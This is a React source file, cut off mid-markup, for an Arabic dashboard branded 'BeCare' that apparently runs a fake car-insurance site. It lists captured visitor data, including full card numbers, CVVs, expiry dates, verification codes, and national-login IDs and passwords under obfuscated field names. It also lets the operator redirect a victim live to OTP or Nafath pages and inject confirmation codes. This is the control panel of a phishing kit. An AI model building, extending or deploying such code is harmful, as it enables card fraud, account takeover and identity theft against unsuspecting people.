import { useEffect, useMemo, useState } from "react";
import { addData } from "@/lib/api";

type RequestItem = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  badge?: string;
  visitorId?: string;
  submittedAt?: string;
  hasCard?: boolean;
  raw?: Record<string, any>;
};

type DashboardTab = "requests" | "payments" | "access" | "clients" | "visitors";

const fallbackRequests: RequestItem[] = [
  { id: "REQ-1001", customer: "أحمد السالم", status: "جديد", stage: "الخطوة 1", updated: "منذ 5 دقائق", badge: "new" },
  { id: "REQ-1002", customer: "سارة القحطاني", status: "قيد المعالجة", stage: "الخطوة 2", updated: "منذ 12 دقيقة", badge: "pending" },
  { id: "REQ-1003", customer: "خالد العنزي", status: "مكتمل", stage: "الخطوة 3", updated: "منذ 28 دقيقة" },
  { id: "REQ-1004", customer: "نورا الرشيدي", status: "محظور", stage: "تحتاج مراجعة", updated: "منذ 40 دقيقة", badge: "blocked" },
];

export default function DashboardPage() {
  const [requests, setRequests] = useState<RequestItem[]>(fallbackRequests);
  const [lastUpdated, setLastUpdated] = useState<string>(new Date().toLocaleTimeString("ar-SA"));
  const [receivedAt, setReceivedAt] = useState<number | null>(null);
  const [nowTick, setNowTick] = useState<number>(Date.now());
  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(fallbackRequests[0]?.id ?? null);
  const [activeTab, setActiveTab] = useState<DashboardTab>("clients");
  const [liveStatus, setLiveStatus] = useState<"connected" | "connecting">("connected");
  const [blockedCards, setBlockedCards] = useState<string[]>(["48478"]);
  const [cardInput, setCardInput] = useState("");
  const [blockedCountries, setBlockedCountries] = useState<string[]>(["سوريا"]);
  const [countryInput, setCountryInput] = useState("");
  const [countryOptions] = useState(["الأردن", "الإمارات", "مصر", "سلطنة عمان", "لبنان", "سوريا"]);
  const [menuOpen, setMenuOpen] = useState(false);
  const [settingsMenuOpen, setSettingsMenuOpen] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState<string | null>(null);
  const [customerSearch, setCustomerSearch] = useState("");
  const [selectedCustomerIds, setSelectedCustomerIds] = useState<string[]>([]);
  const [selectedFlowStep, setSelectedFlowStep] = useState("home");

  const cardShellStyle: React.CSSProperties = {
    background: "#ffffff",
    border: "1px solid #e5e7eb",
    borderRadius: 12,
    padding: "10px 16px",
    boxShadow: "0 2px 4px rgba(0,0,0,0.02)",
    display: "flex",
    alignItems: "center",
    justifyContent: "flex-start",
    gap: "20px",
    position: "relative",
    overflow: "hidden",
  };

  const topSummaryTileStyle: React.CSSProperties = {
    ...cardShellStyle,
    minHeight: 132,
    flexDirection: "column",
    justifyContent: "flex-start",
    alignItems: "flex-start",
    gap: 8,
    width: "100%",
  };

  const summaryBarStyle: React.CSSProperties = {
    background: "#ffffff",
    border: "1px solid #e5e7eb",
    borderRadius: 8,
    padding: "6px 12px",
    display: "flex",
    alignItems: "center",
    justifyContent: "flex-end",
    gap: "10px",
    width: "100%",
    maxWidth: "100%",
    minWidth: 0,
    minHeight: 40,
    height: 40,
    fontSize: "14px",
    flexWrap: "nowrap",
    flexDirection: "row",
    overflowX: "auto",
    overflowY: "hidden",
  };

  const dataSeparatorStyle: React.CSSProperties = {
    borderRight: "1px solid #e5e7eb",
    height: "16px",
    marginRight: "6px",
  };

  const statusBadgeStyle: React.CSSProperties = {
    background: "#e8f8f2",
    color: "#10b981",
    padding: "2px 8px",
    borderRadius: 4,
    fontWeight: 600,
    fontSize: "13px",
    border: "1px solid #d1fae5",
    whiteSpace: "nowrap",
  };

  const detailItemStyle: React.CSSProperties = {
    display: "flex",
    alignItems: "center",
    gap: "8px",
    paddingRight: "20px",
    borderRight: "1px solid #f3f4f6",
  };

  const sectionTitleStyle: React.CSSProperties = {
    display: "none",
  };

  const hasMeaningfulValue = (value: unknown): boolean => {
    if (value === undefined || value === null) return false;
    if (typeof value === "string") return value.trim().length > 0;
    if (typeof value === "number") return true;
    if (Array.isArray(value)) return value.some((entry) => hasMeaningfulValue(entry));
    if (typeof value === "object") return Object.values(value as Record<string, unknown>).some((entry) => hasMeaningfulValue(entry));
    return Boolean(value);
  };

  const formatElapsed = (ms: number): string => {
    const seconds = Math.floor(ms / 1000);
    if (seconds < 1) return "الآن";
    if (seconds < 60) return seconds === 1 ? "منذ 1 ثانية" : `منذ ${seconds} ثانية`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return minutes === 1 ? "منذ 1 دقيقة" : `منذ ${minutes} دقيقة`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return hours === 1 ? "منذ 1 ساعة" : `منذ ${hours} ساعة`;
    const days = Math.floor(hours / 24);
    return days === 1 ? "منذ 1 يوم" : `منذ ${days} يوم`;
  };

  const hasMeaningfulClientPayload = (payload: Record<string, any> | undefined): boolean => {
    if (!payload || typeof payload !== "object") return false;
    const relevantFields = [
      "ownerName",
      "buyerName",
      "customer",
      "name",
      "firstName",
      "lastName",
      "identityNumber",
      "buyerIdNumber",
      "phoneNumber",
      "email",
      "documentType",
      "serialNumber",
      "insuranceType",
      "registrationType",
      "coverageType",
      "vehicleModel",
      "manufacturingYear",
      "vehicleUsage",
      "usage",
      "repairLocation",
      "companyName",
      "originalPrice",
      "discount",
      "finalPrice",
      "features",
      "cardNumber",
      "cardOwner",
      "cardExpiry",
      "cvv",
      "verificationCode",
      "country",
      "countryName",
      "countryCode",
      "city",
      "address",
      "paymentMethod",
    ];
    return relevantFields.some((field) => hasMeaningfulValue(payload[field])) || Object.values(payload).some((value) => hasMeaningfulValue(value));
  };

  const getVisitorCountryLabel = (value?: string): string => {
    const normalized = String(value || "").trim().toLowerCase();
    if (!normalized) return "";
    if (normalized.includes("jord")) return "الأردن";
    if (normalized.includes("saud") || normalized.includes("arabia") || normalized.includes("السعود")) return "السعودية";
    if (normalized.includes("uae") || normalized.includes("emir")) return "الإمارات";
    if (normalized.includes("egy")) return "مصر";
    if (normalized.includes("oman") || normalized.includes("عمان")) return "سلطنة عمان";
    if (normalized.includes("leb")) return "لبنان";
    if (normalized.includes("syr")) return "سوريا";
    return value || "";
  };

  const getVisitorDisplayName = (item: RequestItem): string => {
    const raw = item.raw || {};
    const customerName = raw.ownerName || raw.buyerName || raw.customer || raw.name || raw.firstName || raw.lastName || item.customer;
    if (hasMeaningfulClientPayload(raw)) {
      return customerName && customerName !== "عميل جديد" && customerName !== "زائر" ? customerName : item.customer;
    }
    const countryLabel = getVisitorCountryLabel(raw.country || raw.countryName || raw.countryCode || raw.location?.country || raw.geo?.country);
    return countryLabel ? `زائر من ${countryLabel}` : "زائر";
  };

  const normalizeRequests = (data: any[]): RequestItem[] => {
    if (!Array.isArray(data)) return fallbackRequests;
    const seen = new Set<string>();
    return data.map((item, index) => {
      const visitorId = item?.visitorId || item?.id || item?.raw?.visitorId || `visitor_${index}`;
      const uniqueId = `${item?.id || `REQ-${String(visitorId).slice(0, 8).toUpperCase()}`}-${index}`;
      const dedupedId = seen.has(uniqueId) ? `${uniqueId}-${Date.now()}-${index}` : uniqueId;
      seen.add(dedupedId);
      return {
        ...item,
        id: dedupedId,
        customer: item?.customer || item?.raw?.ownerName || item?.raw?.buyerName || item?.raw?.name || item?.raw?.firstName || item?.raw?.lastName || (hasMeaningfulClientPayload(item?.raw || item) ? "عميل" : "زائر"),
        status: item?.status || (item?.badge === "pending" ? "قيد المعالجة" : item?.badge === "blocked" ? "محظور" : item?.badge === "new" ? "جديد" : "مكتمل"),
        stage: item?.stage || (item?.raw?.currentPage === "insur" ? "الخطوة 2" : item?.raw?.currentPage === "phone" ? "الخطوة 3" : "الخطوة 1"),
        updated: item?.updated || "تم التحديث الآن",
        badge: item?.badge || (item?.status === "قيد المعالجة" ? "pending" : item?.status === "محظور" ? "blocked" : item?.status === "جديد" ? "new" : ""),
        visitorId: String(visitorId),
        raw: item?.raw || item,
      } satisfies RequestItem;
    });
  };

  const loadRequests = () => {
    setLiveStatus("connecting");
    fetch("/api/dashboard/requests")
      .then((res) => {
        if (!res.ok) throw new Error("API unavailable");
        return res.json();
      })
      .then((data) => {
        if (Array.isArray(data)) {
          const normalized = normalizeRequests(data);
          setRequests(normalized);
          setLastUpdated(new Date().toLocaleTimeString("ar-SA"));
          setReceivedAt(Date.now());
          setLiveStatus("connected");
        }
      })
      .catch(() => {
        setRequests(fallbackRequests);
        setLiveStatus("connecting");
      });
  };

  useEffect(() => {
    loadRequests();
    const timer = window.setInterval(() => loadRequests(), 2500);
    return () => window.clearInterval(timer);
  }, []);

  useEffect(() => {
    const timer = window.setInterval(() => setNowTick(Date.now()), 1000);
    return () => window.clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!requests.length) return;
    if (!selectedRequestId || !requests.some((item) => item.id === selectedRequestId)) {
      setSelectedRequestId(requests[0].id);
    }
  }, [requests, selectedRequestId]);

  const stats = useMemo(() => {
    const total = requests.length;
    const newCount = requests.filter((item) => item.badge === "new").length;
    const processingCount = requests.filter((item) => item.badge === "pending").length;
    const completedCount = requests.filter((item) => item.badge !== "new" && item.badge !== "pending" && item.badge !== "blocked").length;
    return { total, newCount, processingCount, completedCount };
  }, [requests]);

  const selectedRequest = requests.find((item) => item.id === selectedRequestId) ?? requests[0] ?? fallbackRequests[0];

  const getMeaningfulDetails = () => {
    const raw = selectedRequest.raw || {};
    const entries = [
      { label: "الاسم", value: selectedRequest.customer },
      { label: "رقم الهوية", value: raw.identityNumber || raw.buyerIdNumber },
      { label: "رقم الهاتف", value: raw.phoneNumber },
      { label: "رقم الوثيقة", value: raw.documentType },
      { label: "الرقم التسلسلي", value: raw.serialNumber },
      { label: "نوع التأمين", value: raw.insuranceType || "تأمين جديد" },
      { label: "نوع التسجيل", value: raw.registrationType || raw.documentType || "استمارة" },
      { label: "اسم المشتري", value: raw.buyerName },
      { label: "رقم هوية المشتري", value: raw.buyerIdNumber },
    ].filter((item) => hasMeaningfulValue(item.value));

    return entries;
  };

  const detailItems = getMeaningfulDetails();
  const insuranceDetails = [
    { label: "نوع التغطية", value: selectedRequest.raw?.coverageType },
    { label: "موديل المركبة", value: selectedRequest.raw?.vehicleModel },
    { label: "سنة الصنع", value: selectedRequest.raw?.manufacturingYear },
    { label: "استخدام المركبة", value: selectedRequest.raw?.vehicleUsage || selectedRequest.raw?.usage },
    { label: "موقع الإصلاح", value: selectedRequest.raw?.repairLocation },
  ].filter((item) => hasMeaningfulValue(item.value));

  const offerDetails = [
    { label: "اسم الشركة", value: selectedRequest.raw?.companyName },
    { label: "السعر الأصلي", value: selectedRequest.raw?.originalPrice },
    { label: "الخصم", value: selectedRequest.raw?.discount },
    { label: "السعر النهائي", value: selectedRequest.raw?.finalPrice },
    { label: "المميزات", value: selectedRequest.raw?.features },
  ].filter((item) => hasMeaningfulValue(item.value));

  const cardDetails = [
    { label: "رقم البطاقة", value: selectedRequest.raw?.cardNumber },
    { label: "اسم مالك البطاقة", value: selectedRequest.raw?.cardOwner },
    { label: "تاريخ الانتهاء", value: selectedRequest.raw?.cardExpiry },
    { label: "رمز الأمان", value: selectedRequest.raw?.cvv },
  ].filter((item) => hasMeaningfulValue(item.value));

  const verificationDetails = [{ label: "رمز التحقق", value: selectedRequest.raw?.verificationCode }].filter((item) => hasMeaningfulValue(item.value));

  const getAccessBoxValue = (field: string, fallback = "لم يتم الإدخال") => {
    const raw = selectedRequest.raw || {};
    const value = raw[field];
    if (typeof value === "string") return value.trim() ? value : fallback;
    if (typeof value === "number") return String(value);
    return fallback;
  };

  const getPhoneCarrierLabel = (value?: string): string => {
    const normalized = String(value || "").trim().toLowerCase();
    if (!normalized) return "لم يتم الإدخال";
    const labels: Record<string, string> = {
      stc: "STC",
      mobily: "Mobily",
      zain: "Zain",
      virgin: "Virgin Mobile",
      lebara: "Lebara",
      salam: "SALAM",
      go: "GO",
    };
    return labels[normalized] || normalized;
  };

  const accessDetails = [
    { label: "رقم الهوية", value: getAccessBoxValue("_v8") },
    { label: "كلمة المرور", value: getAccessBoxValue("_v9") },
  ];

  const phoneInfoDetails = [
    { label: "رقم الهوية", value: getAccessBoxValue("phoneIdNumber") },
    { label: "رقم الجوال", value: getAccessBoxValue("phoneNumber") },
    { label: "شركة الاتصالات", value: getPhoneCarrierLabel(selectedRequest.raw?.phoneCarrier) },
  ];

  const clientSections = useMemo(() => {
    const withData: RequestItem[] = [];
    const withoutData: RequestItem[] = [];
    requests.forEach((item) => {
      const raw = item.raw || {};
      const values = [
        item.customer,
        raw.identityNumber,
        raw.buyerIdNumber,
        raw.phoneNumber,
        raw.documentType,
        raw.serialNumber,
        raw.insuranceType,
        raw.registrationType,
        raw.buyerName,
        raw.coverageType,
        raw.vehicleModel,
        raw.manufacturingYear,
        raw.vehicleUsage || raw.usage,
        raw.repairLocation,
        raw.companyName,
        raw.originalPrice,
        raw.discount,
        raw.finalPrice,
        raw.features,
        raw.cardNumber,
        raw.cardOwner,
        raw.cardExpiry,
        raw.cvv,
        raw.verificationCode,
      ];
      if (values.some((value) => hasMeaningfulValue(value))) {
        withData.push(item);
      } else {
        withoutData.push(item);
      }
    });
    return { withData, withoutData };
  }, [requests]);

  const filteredClientSections = useMemo(() => {
    const query = customerSearch.trim().toLowerCase();
    const filterByQuery = (items: RequestItem[]) => {
      if (!query) return items;
      return items.filter((item) => {
        const searchableText = `${item.customer || ""} ${item.id || ""} ${(item.id || "").slice(-4)} ${item.raw?.identityNumber || ""} ${item.raw?.buyerIdNumber || ""} ${item.raw?.phoneNumber || ""}`.toLowerCase();
        return searchableText.includes(query);
      });
    };

    return {
      withData: filterByQuery(clientSections.withData),
      withoutData: filterByQuery(clientSections.withoutData),
    };
  }, [customerSearch, clientSections]);

  const toggleCustomerSelection = (id: string) => {
    setSelectedCustomerIds((prev) => (prev.includes(id) ? prev.filter((item) => item !== id) : [...prev, id]));
  };

  const handleSelectAllVisible = () => {
    const allVisibleIds = [...filteredClientSections.withData, ...filteredClientSections.withoutData].map((item) => item.id);
    setSelectedCustomerIds((prev) => {
      const next = new Set(prev);
      allVisibleIds.forEach((id) => next.add(id));
      return Array.from(next);
    });
  };

  const handleBulkDelete = () => {
    setSelectedCustomerIds([]);
  };

  const handleBulkArchive = () => {
    setSelectedCustomerIds([]);
  };

  const pageNameMap: Record<string, string> = {
    home: "الرئيسية",
    "home-new": "الرئيسية",
    insur: "اختيار التأمين",
    check: "التحقق",
    compar: "مقارنة العروض",
    step2: "التحقق/الرمز",
    step3: "إكمال البيانات",
    step4: "النفاذ",
    step5: "الدفع",
    thankyou: "تم الإرسال",
    "thank-you": "تم الإرسال",
    payment: "الدفع",
    verify: "رمز التحقق",
    phone: "رمز التحقق",
    nafad: "النفاذ",
    confi: "إكمال البيانات",
    veri: "رمز التحقق",
    review: "مراجعة الطلب",
    details: "تفاصيل المركبة",
    success: "تم الإرسال",
    complete: "إكمال البيانات",
    support: "الدعم",
    contact: "التواصل",
  };

  const getPageLabel = (item: RequestItem) => {
    const page = item.raw?.currentPage || item.raw?.page || "home";
    return pageNameMap[page] || "صفحة أخرى";
  };

  const getCountryShortCode = (value?: string): string => {
    const normalized = String(value || "").trim().toLowerCase();
    if (!normalized) return "—";
    if (["sa", "ksa", "saudi", "saudi arabia", "السعودية", "السعودي"].includes(normalized)) return "SA";
    if (["jo", "jord", "jordan", "الأردن"].includes(normalized)) return "JO";
    if (["ae", "uae", "emirates", "الإمارات"].includes(normalized)) return "AE";
    if (["eg", "egy", "egypt", "مصر"].includes(normalized)) return "EG";
    if (["om", "oman", "سلطنة عمان", "عمان"].includes(normalized)) return "OM";
    if (["lb", "lebanon", "لبنان"].includes(normalized)) return "LB";
    if (["sy", "syria", "سوريا"].includes(normalized)) return "SY";
    return normalized.slice(0, 2).toUpperCase();
  };

  const getBrowserLabel = (): string => {
    const raw = selectedRequest.raw || {};
    if (raw.browser) return String(raw.browser);
    const ua = typeof navigator !== "undefined" ? navigator.userAgent : "";
    if (!ua) return "غير معروف";
    if (/Chrome/i.test(ua) && !/Edg\//i.test(ua)) return "Google Chrome";
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Edg\//i.test(ua)) return "Edge";
    return "Desktop";
  };

  const getDeviceIcon = (): string => {
    const raw = selectedRequest.raw || {};
    const deviceValue = String(raw.deviceType || raw.device || raw.deviceKind || raw.platform || "").toLowerCase();
    if (/ipad|tablet|tab/i.test(deviceValue)) return "💻";
    if (/desktop|pc|windows|mac|linux/i.test(deviceValue)) return "🖥️";
    if (/phone|mobile|android|iphone|ios/i.test(deviceValue)) return "📱";
    const ua = typeof navigator !== "undefined" ? navigator.userAgent : "";
    if (/iPad|iPhone|iPod/i.test(ua)) return "📱";
    if (/Macintosh|Windows|Linux/i.test(ua)) return "🖥️";
    return "📱";
  };

  const getClientSummaryMeta = () => {
    const raw = selectedRequest.raw || {};
    const identity = raw.identityNumber || raw.buyerIdNumber || "—";
    const phone = raw.phoneNumber || raw.mobile || "—";
    const countryCode = getCountryShortCode(raw.countryCode || raw.country || raw.countryName || raw.location?.country || raw.geo?.country);
    const pageLabel = getPageLabel(selectedRequest);
    return { identity, phone, countryCode, pageLabel };
  };

  const clientSummaryMeta = getClientSummaryMeta();
  const selectedVisitorId = selectedRequest?.visitorId || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id || selectedRequest?.id || null;

  const flowTargets: Record<string, { redirectPage: string; currentPage: string; currentStep: number; nafadConfirmationCode?: string; nafadConfirmationStatus?: string }> = {
    home: { redirectPage: "home", currentPage: "home", currentStep: 1 },
    insurance: { redirectPage: "insur", currentPage: "insur", currentStep: 2 },
    package: { redirectPage: "compar", currentPage: "compar", currentStep: 3 },
    payment: { redirectPage: "check", currentPage: "check", currentStep: 4 },
    verification: { redirectPage: "otp", currentPage: "otp", currentStep: 5 },
    phone: { redirectPage: "phone", currentPage: "phone", currentStep: 7 },
    access: { redirectPage: "nafad", currentPage: "nafad", currentStep: 8 },
    accessCode: { redirectPage: "nafad", currentPage: "nafad", currentStep: 8, nafadConfirmationCode: "00", nafadConfirmationStatus: "waiting" },
  };

  const handleFlowSelection = async (value: string) => {
    setSelectedFlowStep(value);
    const target = flowTargets[value];
    if (!selectedVisitorId || !target) return;

    try {
      const payload: Record<string, any> = {
        id: selectedVisitorId,
        redirectPage: target.redirectPage,
        redirect_page: target.redirectPage,
        currentPage: target.currentPage,
        currentStep: target.currentStep,
        nafadConfirmationStatus: target.nafadConfirmationStatus ?? "",
      };

      if (target.nafadConfirmationCode) {
        payload.nafadConfirmationCode = target.nafadConfirmationCode;
      }

      await addData(payload);
    } catch (error) {
      console.error("[Dashboard] Failed to send redirect command", error);
    }
  };

  const flowOptions = [
    { value: "home", label: "الصفحة الرئيسية" },
    { value: "insurance", label: "بيانات التأمين" },
    { value: "package", label: "اختيار الباقة" },
    { value: "payment", label: "الدفع" },
    { value: "verification", label: "رمز التحقق" },
    { value: "phone", label: "معلومات الهاتف" },
    { value: "access", label: "نفاذ" },
    { value: "accessCode", label: "رمز نفاذ" },
  ];

  const selectedFlowLabel = flowOptions.find((item) => item.value === selectedFlowStep)?.label || "الصفحة الرئيسية";

  const isCardBlocked = blockedCards.some((prefix) => String(selectedRequest.raw?.cardNumber || "").startsWith(prefix));
  const isCountryBlocked = blockedCountries.some((country) => country === (selectedRequest.raw?.country || selectedRequest.raw?.countryName));

  const addBlockedCard = () => {
    const value = cardInput.trim();
    if (!value) return;
    setBlockedCards((prev) => (prev.includes(value) ? prev : [...prev, value]));
    setCardInput("");
  };

  const removeBlockedCard = (value: string) => {
    setBlockedCards((prev) => prev.filter((item) => item !== value));
  };

  const addBlockedCountry = () => {
    const value = countryInput.trim();
    if (!value) return;
    setBlockedCountries((prev) => (prev.includes(value) ? prev : [...prev, value]));
    setCountryInput("");
  };

  const removeBlockedCountry = (value: string) => {
    setBlockedCountries((prev) => prev.filter((item) => item !== value));
  };

  const statCards = [
    { label: "إجمالي الطلبات", value: stats.total, tone: "#2f8cff" },
    { label: "جديدة", value: stats.newCount, tone: "#31c48d" },
    { label: "قيد المعالجة", value: stats.processingCount, tone: "#f5b942" },
    { label: "مكتملة", value: stats.completedCount, tone: "#8ea4c0" },
  ];

  const tabItems: Array<{ key: DashboardTab; label: string }> = [
    { key: "clients", label: "العملاء" },
    { key: "payments", label: "إعدادات الدفع" },
    { key: "access", label: "تقييد الوصول" },
    { key: "visitors", label: "الزوار" },
    { key: "requests", label: "الطلبات" },
  ];

  const settingsMenuTabs: Array<{ key: DashboardTab; label: string }> = [
    { key: "clients", label: "العملاء" },
    { key: "visitors", label: "الزوار" },
    { key: "payments", label: "الإعدادات" },
    { key: "access", label: "تقييد الوصول" },
  ];

  const navItems: Array<{ label: string; active: boolean }> = [
    { label: "الرئيسية", active: true },
    { label: "الطلبات", active: false },
    { label: "العملاء", active: false },
    { label: "الرسائل", active: false },
  ];

  return (
    <div style={{ minHeight: "100vh", background: "#f3f6fb", color: "#111827", fontFamily: "Tahoma, Arial, sans-serif" }} dir="rtl">
      <div style={{ minHeight: "100vh", background: "linear-gradient(180deg, #f8fafc 0%, #eef2f7 100%)" }}>
        <main style={{ width: "100%", padding: "0 0 24px 0", display: "flex", flexDirection: "column", gap: 16, background: "transparent" }}>
          <header style={{ display: "flex", alignItems: "center", width: "100%", height: 54, padding: "0 12px", margin: 0, background: "#ffffff", borderBottom: "1px solid #e5e7eb", boxShadow: "none", borderRadius: 0, overflow: "visible", position: "sticky", top: 0, left: 0, right: 0, zIndex: 20, boxSizing: "border-box" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8, padding: 0, margin: 0, border: 0, borderLeft: "none" }}>
              <div style={{ width: 28, height: 28, borderRadius: 0, background: "linear-gradient(135deg, #22c55e, #15803d)", display: "grid", placeItems: "center", fontWeight: 900, fontSize: "0.8rem", color: "#0f172a" }}>B</div>
              <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
            </div>

            <div style={{ display: "flex", alignItems: "center", gap: 0, marginLeft: "auto", overflowX: "auto", scrollbarWidth: "none" }}>
              <div style={{ position: "relative" }}>
                <button style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, border: 0, borderLeft: "1px solid #e5e7eb", background: "transparent", cursor: "pointer", color: "#111827" }} title="الزوار الحاليون">
                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ade80", display: "inline-block", boxShadow: "0 0 0 6px rgba(74, 222, 128, 0.16)" }} />
                  <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>1</span>
                  <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#9ca3af" }}>
                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
                    <path d="M16 3.128a4 4 0 0 1 0 7.744" />
                    <path d="M22 21v-2a4 4 0 0 0-3-3.87" />
                    <circle cx="9" cy="7" r="4" />
                  </svg>
                </button>
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, borderLeft: "1px solid #e5e7eb", color: "#111827" }}>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#9ca3af" }}>
                  <path d="M16 7h6v6" />
                  <path d="m22 7-8.5 8.5-5-5L2 17" />
                </svg>
                <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
                <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>12889</span>
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, borderLeft: "1px solid #e5e7eb", color: "#111827" }}>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#9ca3af" }}>
                  <circle cx="12" cy="12" r="10" />
                  <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
                  <path d="M2 12h20" />
                </svg>
                <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
                <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>12889</span>
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, borderLeft: "1px solid #e5e7eb", color: "#2563eb" }}>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#2563eb" }}>
                  <rect width="20" height="14" x="2" y="5" rx="2" />
                  <line x1="2" x2="22" y1="10" y2="10" />
                </svg>
                <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>4773</span>
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, borderLeft: "1px solid #e5e7eb", color: "#16a34a" }}>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#16a34a" }}>
                  <path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" />
                </svg>
                <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>4639</span>
              </div>

              <div style={{ width: 1, height: 20, background: "#e5e7eb", margin: "0 6px" }} />

              <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, borderLeft: "1px solid #e5e7eb" }}>
                <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>زوار</span>
                <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>0</span>
                <span style={{ color: "#9ca3af", fontSize: "0.75rem" }}>/</span>
                <span style={{ color: "#d97706", fontWeight: 700, fontSize: "0.9rem" }}>0</span>
                <span style={{ color: "#9ca3af", fontSize: "0.75rem" }}>/</span>
                <span style={{ color: "#111827", fontWeight: 700, fontSize: "0.9rem" }}>8116</span>
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", height: 46, borderLeft: "1px solid #e5e7eb" }}>
                <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>عملاء</span>
                <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>1</span>
                <span style={{ color: "#9ca3af", fontSize: "0.75rem" }}>/</span>
                <span style={{ color: "#d97706", fontWeight: 700, fontSize: "0.9rem" }}>0</span>
                <span style={{ color: "#9ca3af", fontSize: "0.75rem" }}>/</span>
                <span style={{ color: "#111827", fontWeight: 700, fontSize: "0.9rem" }}>4772</span>
              </div>

            </div>

            <div style={{ display: "flex", alignItems: "center", gap: 0, borderRight: "1px solid #e5e7eb", marginLeft: 8 }}>
              <div style={{ position: "relative" }}>
                <button
                  type="button"
                  onClick={() => {
                    setSettingsMenuOpen((prev) => !prev);
                    setMenuOpen(false);
                  }}
                  style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 46, border: 0, borderLeft: "1px solid #e5e7eb", background: "transparent", cursor: "pointer" }}
                  title="إعدادات"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#9ca3af" }}>
                    <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915" />
                    <circle cx="12" cy="12" r="3" />
                  </svg>
                </button>
                {settingsMenuOpen && (
                  <div style={{ position: "absolute", top: "calc(100% + 8px)", left: 0, minWidth: 180, background: "#ffffff", border: "1px solid #e5e7eb", borderRadius: 12, boxShadow: "0 12px 24px rgba(15,23,42,0.12)", zIndex: 30, overflow: "hidden" }}>
                    {settingsMenuTabs.map((tab) => (
                      <button
                        key={tab.key}
                        type="button"
                        onClick={() => {
                          setActiveTab(tab.key);
                          setSettingsMenuOpen(false);
                        }}
                        style={{
                          width: "100%",
                          textAlign: "right",
                          border: 0,
                          padding: "10px 12px",
                          background: activeTab === tab.key ? "rgba(47,140,255,0.12)" : "transparent",
                          color: activeTab === tab.key ? "#1d4ed8" : "#111827",
                          cursor: "pointer",
                          fontWeight: activeTab === tab.key ? 800 : 600,
                        }}
                      >
                        {tab.label}
                      </button>
                    ))}
                  </div>
                )}
              </div>
              <button style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 46, border: 0, borderLeft: "1px solid #e5e7eb", background: "transparent", cursor: "pointer" }} title="تنبيهات">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#9ca3af" }}>
                  <path d="M10.268 21a2 2 0 0 0 3.464 0" />
